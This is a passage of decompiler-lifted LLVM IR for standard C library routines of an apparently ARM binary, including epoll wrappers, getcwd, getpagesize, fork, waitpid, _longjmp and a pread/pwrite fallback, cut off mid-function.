  %v0_22a88 = call i32 @__GI___errno_location()
  %v0_22a8c = load i32, i32* %r4.global-to-local, align 4
  %v1_22a8c = sub i32 0, %v0_22a8c
  %v2_22a90 = inttoptr i32 %v0_22a88 to i32*
  store i32 %v1_22a8c, i32* %v2_22a90, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_22a98.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_22a98

dec_label_pc_22a98:                               ; preds = %entry, %dec_label_pc_22a88
  %v1_22a9c = phi i32 [ %v0_22a78, %entry ], [ -1, %dec_label_pc_22a88 ]
  %v2_22a98 = phi i32 [ %v3_22a64, %entry ], [ %v2_22a98.pre, %dec_label_pc_22a88 ]
  store i32 %v2_22a98, i32* %r4.global-to-local, align 4
  ret i32 %v1_22a9c

; uselistorder directives
  uselistorder i32 %v0_22a78, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_22a98, { 1, 0 }
}

define i32 @__libc_epoll_wait(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_22aa4 = load i32, i32* @r7, align 4
  store i32 %v3_22aa4, i32* %stack_var_-8, align 4
  %v0_22ab0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_22ab0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_22ab0, -4095
  br i1 %tmp, label %dec_label_pc_22ad0, label %dec_label_pc_22ac0

dec_label_pc_22ac0:                               ; preds = %entry
  %v0_22ac0 = call i32 @__GI___errno_location()
  %v0_22ac4 = load i32, i32* %r7.global-to-local, align 4
  %v1_22ac4 = sub i32 0, %v0_22ac4
  %v2_22ac8 = inttoptr i32 %v0_22ac0 to i32*
  store i32 %v1_22ac4, i32* %v2_22ac8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_22ad0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_22ad0

dec_label_pc_22ad0:                               ; preds = %entry, %dec_label_pc_22ac0
  %v1_22ad4 = phi i32 [ %v0_22ab0, %entry ], [ -1, %dec_label_pc_22ac0 ]
  %v2_22ad0 = phi i32 [ %v3_22aa4, %entry ], [ %v2_22ad0.pre, %dec_label_pc_22ac0 ]
  store i32 %v2_22ad0, i32* %r7.global-to-local, align 4
  ret i32 %v1_22ad4

; uselistorder directives
  uselistorder i32 %v0_22ab0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_22ad0, { 1, 0 }
}

define i32 @epoll_ctl(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_22ad8 = load i32, i32* @r7, align 4
  store i32 %v3_22ad8, i32* %stack_var_-8, align 4
  %v0_22ae4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_22ae4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_22ae4, -4095
  br i1 %tmp, label %dec_label_pc_22b04, label %dec_label_pc_22af4

dec_label_pc_22af4:                               ; preds = %entry
  %v0_22af4 = call i32 @__GI___errno_location()
  %v0_22af8 = load i32, i32* %r7.global-to-local, align 4
  %v1_22af8 = sub i32 0, %v0_22af8
  %v2_22afc = inttoptr i32 %v0_22af4 to i32*
  store i32 %v1_22af8, i32* %v2_22afc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_22b04.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_22b04

dec_label_pc_22b04:                               ; preds = %entry, %dec_label_pc_22af4
  %v1_22b08 = phi i32 [ %v0_22ae4, %entry ], [ -1, %dec_label_pc_22af4 ]
  %v2_22b04 = phi i32 [ %v3_22ad8, %entry ], [ %v2_22b04.pre, %dec_label_pc_22af4 ]
  store i32 %v2_22b04, i32* %r7.global-to-local, align 4
  ret i32 %v1_22b08

; uselistorder directives
  uselistorder i32 %v0_22ae4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_22b04, { 1, 0 }
}

define i32 @epoll_create1(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_22b0c = load i32, i32* @r7, align 4
  store i32 %v3_22b0c, i32* %stack_var_-8, align 4
  %v0_22b18 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_22b18, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_22b18, -4095
  br i1 %tmp, label %dec_label_pc_22b38, label %dec_label_pc_22b28

dec_label_pc_22b28:                               ; preds = %entry
  %v0_22b28 = call i32 @__GI___errno_location()
  %v0_22b2c = load i32, i32* %r7.global-to-local, align 4
  %v1_22b2c = sub i32 0, %v0_22b2c
  %v2_22b30 = inttoptr i32 %v0_22b28 to i32*
  store i32 %v1_22b2c, i32* %v2_22b30, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_22b38.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_22b38

dec_label_pc_22b38:                               ; preds = %entry, %dec_label_pc_22b28
  %v1_22b3c = phi i32 [ %v0_22b18, %entry ], [ -1, %dec_label_pc_22b28 ]
  %v2_22b38 = phi i32 [ %v3_22b0c, %entry ], [ %v2_22b38.pre, %dec_label_pc_22b28 ]
  store i32 %v2_22b38, i32* %r7.global-to-local, align 4
  ret i32 %v1_22b3c

; uselistorder directives
  uselistorder i32 %v0_22b18, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_22b38, { 1, 0 }
}

define i32 @epoll_create(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_22b44 = load i32, i32* @r7, align 4
  store i32 %v3_22b44, i32* %stack_var_-8, align 4
  %v0_22b50 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_22b50, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_22b50, -4095
  br i1 %tmp, label %dec_label_pc_22b70, label %dec_label_pc_22b60

dec_label_pc_22b60:                               ; preds = %entry
  %v0_22b60 = call i32 @__GI___errno_location()
  %v0_22b64 = load i32, i32* %r7.global-to-local, align 4
  %v1_22b64 = sub i32 0, %v0_22b64
  %v2_22b68 = inttoptr i32 %v0_22b60 to i32*
  store i32 %v1_22b64, i32* %v2_22b68, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_22b70.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_22b70

dec_label_pc_22b70:                               ; preds = %entry, %dec_label_pc_22b60
  %v1_22b74 = phi i32 [ %v0_22b50, %entry ], [ -1, %dec_label_pc_22b60 ]
  %v2_22b70 = phi i32 [ %v3_22b44, %entry ], [ %v2_22b70.pre, %dec_label_pc_22b60 ]
  store i32 %v2_22b70, i32* %r7.global-to-local, align 4
  ret i32 %v1_22b74

; uselistorder directives
  uselistorder i32 %v0_22b50, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_22b70, { 1, 0 }
}

define i32 @sched_getparam(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_22b78 = load i32, i32* @r7, align 4
  store i32 %v3_22b78, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_22ba0, label %dec_label_pc_22b90

dec_label_pc_22b90:                               ; preds = %entry
  %v0_22b90 = call i32 @__GI___errno_location()
  %v0_22b94 = load i32, i32* %r7.global-to-local, align 4
  %v1_22b94 = sub i32 0, %v0_22b94
  %v2_22b98 = inttoptr i32 %v0_22b90 to i32*
  store i32 %v1_22b94, i32* %v2_22b98, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_22ba4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_22ba0

dec_label_pc_22ba0:                               ; preds = %entry, %dec_label_pc_22b90
  %v2_22ba4 = phi i32 [ %v3_22b78, %entry ], [ %v2_22ba4.pre, %dec_label_pc_22b90 ]
  %v0_22ba0 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_22b90 ]
  store i32 %v2_22ba4, i32* @r7, align 4
  ret i32 %v0_22ba0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_22ba0, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_22bac = load i32, i32* @r4, align 4
  %v6_22bac = load i32, i32* @r5, align 4
  %v9_22bac = load i32, i32* @r6, align 4
  %v12_22bac = load i32, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  %v2_22bb0 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r4, align 4
  %v2_22bc0 = icmp eq i32 %arg1, 0
  br i1 %v2_22bb0, label %dec_label_pc_22bc0, label %dec_label_pc_22bf0

dec_label_pc_22bc0:                               ; preds = %entry
  br i1 %v2_22bc0, label %dec_label_pc_22bdc, label %dec_label_pc_22bc8

dec_label_pc_22bc8:                               ; preds = %dec_label_pc_22bc0
  %v0_22bc8 = call i32 @__GI___errno_location()
  %v0_22bcc = load i32, i32* @r6, align 4
  store i32 %v0_22bcc, i32* @r4, align 4
  %v2_22bd4 = inttoptr i32 %v0_22bc8 to i32*
  store i32 22, i32* %v2_22bd4, align 4
  br label %dec_label_pc_22c88

dec_label_pc_22bdc:                               ; preds = %dec_label_pc_22bc0
  %v0_22bdc = call i32 @__GI_getpagesize()
  %v5_22be4 = icmp slt i32 %v0_22bdc, 4096
  br i1 %v5_22be4, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_22bdc
  store i32 %v0_22bdc, i32* @r7, align 4
  br label %dec_label_pc_22c00

bb16:                                             ; preds = %dec_label_pc_22bdc
  store i32 4096, i32* @r7, align 4
  br label %dec_label_pc_22c00

dec_label_pc_22bf0:                               ; preds = %entry
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_22bc0, label %dec_label_pc_22c00, label %bb17

bb17:                                             ; preds = %dec_label_pc_22bf0
  br label %dec_label_pc_22c14

dec_label_pc_22c00:                               ; preds = %dec_label_pc_22bf0, %bb, %bb16
  %v0_22c00 = phi i32 [ %v0_22bdc, %bb ], [ 4096, %bb16 ], [ %arg2, %dec_label_pc_22bf0 ]
  %v1_22c04 = call i32 @malloc(i32 %v0_22c00)
  %v2_22c08 = icmp eq i32 %v1_22c04, 0
  br i1 %v2_22c08, label %dec_label_pc_22c84, label %dec_label_pc_22c10

dec_label_pc_22c10:                               ; preds = %dec_label_pc_22c00
  br label %dec_label_pc_22c14

dec_label_pc_22c14:                               ; preds = %bb17, %dec_label_pc_22c10
  %storemerge = phi i32 [ %arg1, %bb17 ], [ %v1_22c04, %dec_label_pc_22c10 ]
  %v0_22c58 = phi i32 [ %arg1, %bb17 ], [ %v1_22c04, %dec_label_pc_22c10 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 %v0_22c58, i32* @r7, align 4
  %tmp = icmp ult i32 %v0_22c58, -4095
  br i1 %tmp, label %dec_label_pc_22c40, label %dec_label_pc_22c30

dec_label_pc_22c30:                               ; preds = %dec_label_pc_22c14
  %v0_22c30 = call i32 @__GI___errno_location()
  %v0_22c34 = load i32, i32* @r7, align 4
  %v1_22c34 = sub i32 0, %v0_22c34
  %v2_22c38 = inttoptr i32 %v0_22c30 to i32*
  store i32 %v1_22c34, i32* %v2_22c38, align 4
  br label %dec_label_pc_22c70

dec_label_pc_22c40:                               ; preds = %dec_label_pc_22c14
  %v1_22c40 = icmp slt i32 %v0_22c58, 0
  br i1 %v1_22c40, label %dec_label_pc_22c70, label %dec_label_pc_22c48

dec_label_pc_22c48:                               ; preds = %dec_label_pc_22c40
  %v0_22c48 = load i32, i32* @r4, align 4
  %v2_22c48 = icmp eq i32 %v0_22c48, 0
  br i1 %v2_22c48, label %bb18, label %dec_label_pc_22c64.thread7

dec_label_pc_22c64.thread7:                       ; preds = %dec_label_pc_22c48
  br label %dec_label_pc_22c88

bb18:                                             ; preds = %dec_label_pc_22c48
  %v1_22c4c = load i32, i32* @r6, align 4
  %v3_22c4c = icmp eq i32 %v1_22c4c, 0
  br i1 %v3_22c4c, label %dec_label_pc_22c64, label %dec_label_pc_22c64.thread

dec_label_pc_22c64.thread:                        ; preds = %bb18
  br label %bb19

dec_label_pc_22c64:                               ; preds = %bb18
  %v2_22c5c = inttoptr i32 %v0_22c58 to i32*
  %v3_22c5c = call i32 @realloc(i32* %v2_22c5c, i32 %v0_22c58)
  store i32 %v3_22c5c, i32* @r4, align 4
  %v2_22c64 = icmp eq i32 %v3_22c5c, 0
  br i1 %v2_22c64, label %dec_label_pc_22c64.bb19_crit_edge, label %dec_label_pc_22c88

dec_label_pc_22c64.bb19_crit_edge:                ; preds = %dec_label_pc_22c64
  %v1_22c68.pre = load i32, i32* @r5, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_22c64.bb19_crit_edge, %dec_label_pc_22c64.thread
  %v1_22c68 = phi i32 [ %v1_22c68.pre, %dec_label_pc_22c64.bb19_crit_edge ], [ %v0_22c58, %dec_label_pc_22c64.thread ]
  store i32 %v1_22c68, i32* @r4, align 4
  br label %dec_label_pc_22c88

dec_label_pc_22c70:                               ; preds = %dec_label_pc_22c40, %dec_label_pc_22c30
  %v0_22c70 = load i32, i32* @r4, align 4
  %v2_22c70 = icmp eq i32 %v0_22c70, 0
  br i1 %v2_22c70, label %dec_label_pc_22c78, label %dec_label_pc_22c84

dec_label_pc_22c78:                               ; preds = %dec_label_pc_22c70
  %v0_22c78 = load i32, i32* @r5, align 4
  store i32 %v0_22c78, i32* @r0, align 4
  %v0_22c7c = call i32 @free()
  br label %dec_label_pc_22c88

dec_label_pc_22c84:                               ; preds = %dec_label_pc_22c70, %dec_label_pc_22c00
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_22c88

dec_label_pc_22c88:                               ; preds = %dec_label_pc_22c64.thread7, %bb19, %dec_label_pc_22c64, %dec_label_pc_22c78, %dec_label_pc_22bc8, %dec_label_pc_22c84
  %v0_22c88 = load i32, i32* @r4, align 4
  store i32 %v3_22bac, i32* @r4, align 4
  store i32 %v6_22bac, i32* @r5, align 4
  store i32 %v9_22bac, i32* @r6, align 4
  store i32 %v12_22bac, i32* @r7, align 4
  ret i32 %v0_22c88

; uselistorder directives
  uselistorder i32 %v0_22c58, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v1_22c04, { 1, 0, 2 }
  uselistorder i32 %v0_22bdc, { 0, 2, 1 }
  uselistorder i32 ()* @__GI_getpagesize, { 1, 3, 2, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_22c88, { 5, 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_22c14, { 1, 0 }
  uselistorder label %dec_label_pc_22c00, { 0, 2, 1 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_22ca4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 220) to i32*), align 4
  %v1_22ca8 = inttoptr i32 %v4_22ca4 to i32*
  %v2_22ca8 = load i32, i32* %v1_22ca8, align 4
  %v2_22cac = icmp eq i32 %v2_22ca8, 0
  br i1 %v2_22cac, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_22cb4 = phi i32 [ %v2_22ca8, %entry ], [ 4096, %bb ]
  ret i32 %v1_22cb4

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_getpid() local_unnamed_addr {
entry:
  %v1_22cd0 = load i32, i32* @r0, align 4
  ret i32 %v1_22cd0
}

define i32 @sched_getscheduler(i32 %arg1) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_22cd4 = load i32, i32* @r7, align 4
  store i32 %v3_22cd4, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_22cfc, label %dec_label_pc_22cec

dec_label_pc_22cec:                               ; preds = %entry
  %v0_22cec = call i32 @__GI___errno_location()
  %v0_22cf0 = load i32, i32* %r7.global-to-local, align 4
  %v1_22cf0 = sub i32 0, %v0_22cf0
  %v2_22cf4 = inttoptr i32 %v0_22cec to i32*
  store i32 %v1_22cf0, i32* %v2_22cf4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_22d00.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_22cfc

dec_label_pc_22cfc:                               ; preds = %entry, %dec_label_pc_22cec
  %v2_22d00 = phi i32 [ %v3_22cd4, %entry ], [ %v2_22d00.pre, %dec_label_pc_22cec ]
  %v0_22cfc = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_22cec ]
  store i32 %v2_22d00, i32* @r7, align 4
  ret i32 %v0_22cfc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_22cfc, { 1, 0 }
}

define i32 @sched_yield(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_22d08 = load i32, i32* @r7, align 4
  store i32 %v3_22d08, i32* %stack_var_-8, align 4
  %v0_22d14 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_22d14, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_22d14, -4095
  br i1 %tmp, label %dec_label_pc_22d34, label %dec_label_pc_22d24

dec_label_pc_22d24:                               ; preds = %entry
  %v0_22d24 = call i32 @__GI___errno_location()
  %v0_22d28 = load i32, i32* %r7.global-to-local, align 4
  %v1_22d28 = sub i32 0, %v0_22d28
  %v2_22d2c = inttoptr i32 %v0_22d24 to i32*
  store i32 %v1_22d28, i32* %v2_22d2c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_22d34.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_22d34

dec_label_pc_22d34:                               ; preds = %entry, %dec_label_pc_22d24
  %v1_22d38 = phi i32 [ %v0_22d14, %entry ], [ -1, %dec_label_pc_22d24 ]
  %v2_22d34 = phi i32 [ %v3_22d08, %entry ], [ %v2_22d34.pre, %dec_label_pc_22d24 ]
  store i32 %v2_22d34, i32* @r7, align 4
  ret i32 %v1_22d38

; uselistorder directives
  uselistorder i32 %v0_22d14, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_22d34, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_22d40 = ptrtoint i32* %stack_var_-16 to i32
  %v2_22d50 = call i32 @gettimeofday(i32 %v2_22d40, i32 0)
  %v2_22d54 = load i32, i32* %stack_var_-16, align 4
  %v2_22d58 = icmp eq i32* %arg1, null
  br i1 %v2_22d58, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_22d54, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_22d54

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_22d6c = load i32, i32* @r7, align 4
  store i32 %v3_22d6c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_22d94, label %dec_label_pc_22d84

dec_label_pc_22d84:                               ; preds = %entry
  %v0_22d84 = call i32 @__GI___errno_location()
  %v0_22d88 = load i32, i32* %r7.global-to-local, align 4
  %v1_22d88 = sub i32 0, %v0_22d88
  %v2_22d8c = inttoptr i32 %v0_22d84 to i32*
  store i32 %v1_22d88, i32* %v2_22d8c, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_22d98.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_22d94

dec_label_pc_22d94:                               ; preds = %entry, %dec_label_pc_22d84
  %v2_22d98 = phi i32 [ %v3_22d6c, %entry ], [ %v2_22d98.pre, %dec_label_pc_22d84 ]
  %v0_22d94 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_22d84 ]
  store i32 %v2_22d98, i32* @r7, align 4
  ret i32 %v0_22d94

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_22d94, { 1, 0 }
}

define i32 @__libc_wait(i32 %arg1) local_unnamed_addr {
entry:
  %v2_22db8 = call i32 @wait4(i32 -1, i32 %arg1)
  ret i32 %v2_22db8
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_22dd8 = load i32, i32* @r0, align 4
  ret i32 %v1_22dd8
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_22ddc = load i32, i32* @r7, align 4
  store i32 %v3_22ddc, i32* %stack_var_-8, align 4
  %v0_22de8 = load i32, i32* @r0, align 4
  store i32 %v0_22de8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_22de8, -4095
  br i1 %tmp, label %dec_label_pc_22e08, label %dec_label_pc_22df8

dec_label_pc_22df8:                               ; preds = %entry
  %v0_22df8 = call i32 @__GI___errno_location()
  %v0_22dfc = load i32, i32* %r7.global-to-local, align 4
  %v1_22dfc = sub i32 0, %v0_22dfc
  %v2_22e00 = inttoptr i32 %v0_22df8 to i32*
  store i32 %v1_22dfc, i32* %v2_22e00, align 4
  %v2_22e08.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_22e08

dec_label_pc_22e08:                               ; preds = %entry, %dec_label_pc_22df8
  %v1_22e0c = phi i32 [ %v0_22de8, %entry ], [ -1, %dec_label_pc_22df8 ]
  %v2_22e08 = phi i32 [ %v3_22ddc, %entry ], [ %v2_22e08.pre, %dec_label_pc_22df8 ]
  store i32 %v2_22e08, i32* @r7, align 4
  ret i32 %v1_22e0c

; uselistorder directives
  uselistorder i32 %v0_22de8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_22e08, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_22e1c = load i32, i32* @r0, align 4
  %v1_22e1c = load i32, i32* @r1, align 4
  %v2_22e1c = call i32 @wait4(i32 %v0_22e1c, i32 %v1_22e1c)
  ret i32 %v2_22e1c
}

define i32 @_longjmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %v1_22e2c = add i32 %arg1, 256
  %v2_22e2c = inttoptr i32 %v1_22e2c to i32*
  %v3_22e2c = load i32, i32* %v2_22e2c, align 4
  %v2_22e30 = icmp eq i32 %v3_22e2c, 0
  store i32 %arg1, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  br i1 %v2_22e30, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v1_22e48 = xor i1 %v2_22e30, true
  call void @__pseudo_cond_branch(i1 %v1_22e48, i32 ptrtoint (i32* @global_var_23580.1559 to i32))
  %v0_22e4c = load i32, i32* %r5.global-to-local, align 4
  %v2_22e4c = icmp eq i32 %v0_22e4c, 0
  %.v0_22e4c = select i1 %v2_22e4c, i32 1, i32 %v0_22e4c
  store i32 %.v0_22e4c, i32* @r1, align 4
  %v0_22e58 = load i32, i32* %r4.global-to-local, align 4
  %v1_22e5c = inttoptr i32 %v0_22e58 to i32*
  %v2_22e5c = call i32 @__longjmp(i32* %v1_22e5c)
  ret i32 %v2_22e5c

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__fake_pread_write64() local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %v0_22e6c = load i32, i32* @r2, align 4
  store i32 %v0_22e6c, i32* @r7, align 4
  %v0_22e7c = load i32, i32* @r1, align 4
  store i32 %v0_22e7c, i32* %r6.global-to-local, align 4
  %v0_22e80 = load i32, i32* @r0, align 4
  store i32 %v0_22e80, i32* %r8.global-to-local, align 4
  %v5_22e84 = call i32 @__GI_lseek64(i32 %v0_22e80, i32 %v0_22e7c, i32 0, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v3_22e88 = icmp eq i32 %v5_22e84, -1
  store i32 %v5_22e84, i32* @r4, align 4
  %v0_22e90 = load i32, i32* @r1, align 4
  store i32 %v0_22e90, i32* %r5.global-to-local, align 4
  br i1 %v3_22e88, label %dec_label_pc_22e98, label %dec_label_pc_22ea0

dec_label_pc_22e98:                               ; preds = %entry
  %v7_22e98 = icmp eq i32 %v0_22e90, -1
  br i1 %v7_22e98, label %dec_label_pc_22f40, label %dec_label_pc_22ea0

dec_label_pc_22ea0:                               ; preds = %entry, %dec_label_pc_22e98
  %v0_22eac = load i32, i32* %r8.global-to-local, align 4
  %v5_22eb4 = call i32 @__GI_lseek64(i32 %v0_22eac, i32 0, i32 %tmp8, i32 %tmp2, i32 0)
  %v3_22eb8 = icmp eq i32 %v5_22eb4, -1
  br i1 %v3_22eb8, label %dec_label_pc_22ec0, label %dec_label_pc_22ec8

dec_label_pc_22ec0:                               ; preds = %dec_label_pc_22ea0
  br label %dec_label_pc_22ec8

dec_label_pc_22ec8:                               ; preds = %dec_label_pc_22ec0, %dec_label_pc_22ea0
  %v7_22ecc = icmp eq i32 %tmp, 1
  %v0_22edc = load i32, i32* %r8.global-to-local, align 4
  br i1 %v7_22ecc, label %dec_label_pc_22ed4, label %dec_label_pc_22ee8

dec_label_pc_22ed4:                               ; preds = %dec_label_pc_22ec8
  %v0_22ed4 = load i32, i32* %r6.global-to-local, align 4
  %v2_22ee0 = call i32 @__GI_write(i32 %v0_22edc, i32 %v0_22ed4)
  br label %dec_label_pc_22ef8

dec_label_pc_22ee8:                               ; preds = %dec_label_pc_22ec8
  %v1_22ef4 = call i32 @__GI_read(i32 %v0_22edc)
  br label %dec_label_pc_22ef8

dec_label_pc_22ef8:                               ; preds = %dec_label_pc_22ed4, %dec_label_pc_22ee8
  %storemerge = phi i32 [ %v1_22ef4, %dec_label_pc_22ee8 ], [ %v2_22ee0, %dec_label_pc_22ed4 ]
  store i32 %storemerge, i32* @r7, align 4
  %v0_22efc = call i32 @__GI___errno_location()
  %v0_22f00 = load i32, i32* @r4, align 4
  store i32 %v0_22efc, i32* %r6.global-to-local, align 4
  %v0_22f0c = load i32, i32* %r5.global-to-local, align 4
  %v0_22f10 = load i32, i32* %r8.global-to-local, align 4
  %v1_22f14 = inttoptr i32 %v0_22efc to i32*
  %v2_22f14 = load i32, i32* %v1_22f14, align 4
  store i32 %v2_22f14, i32* @r4, align 4
  %v5_22f1c = call i32 @__GI_lseek64(i32 %v0_22f10, i32 0, i32 %v0_22f00, i32 %v0_22f0c, i32 0)
  %v3_22f20 = icmp eq i32 %v5_22f1c, -1
  br i1 %v3_22f20, label %dec_label_pc_22f28, label %dec_label_pc_22f38

dec_label_pc_22f28:                               ; preds = %dec_label_pc_22ef8
  br label %dec_label_pc_22f38

dec_label_pc_22f38:                               ; preds = %dec_label_pc_22f28, %dec_label_pc_22ef8
  %v0_22f38 = load i32, i32* @r4, align 4
  %v1_22f38 = load i32, i32* %r6.global-to-local, align 4
  %v2_22f38 = inttoptr i32 %v1_22f38 to i32*
  store i32 %v0_22f38, i32* %v2_22f38, align 4
  %v0_22f44.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_22f44

dec_label_pc_22f40:                               ; preds = %dec_label_pc_22e98
  br label %dec_label_pc_22f44

dec_label_pc_22f44:                               ; preds = %dec_label_pc_22f38, %dec_label_pc_22f40
  %v0_22f44 = phi i32 [ %v0_22f44.pre, %dec_label_pc_22f38 ], [ -1, %dec_label_pc_22f40 ]
  ret i32 %v0_22f44

; uselistorder directives
  uselistorder label %dec_label_pc_22f44, { 1, 0 }
  uselistorder label %dec_label_pc_22ef8, { 1, 0 }
  uselistorder label %dec_label_pc_22ea0, { 1, 0 }
}

define i32 @__libc_pwrite64(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
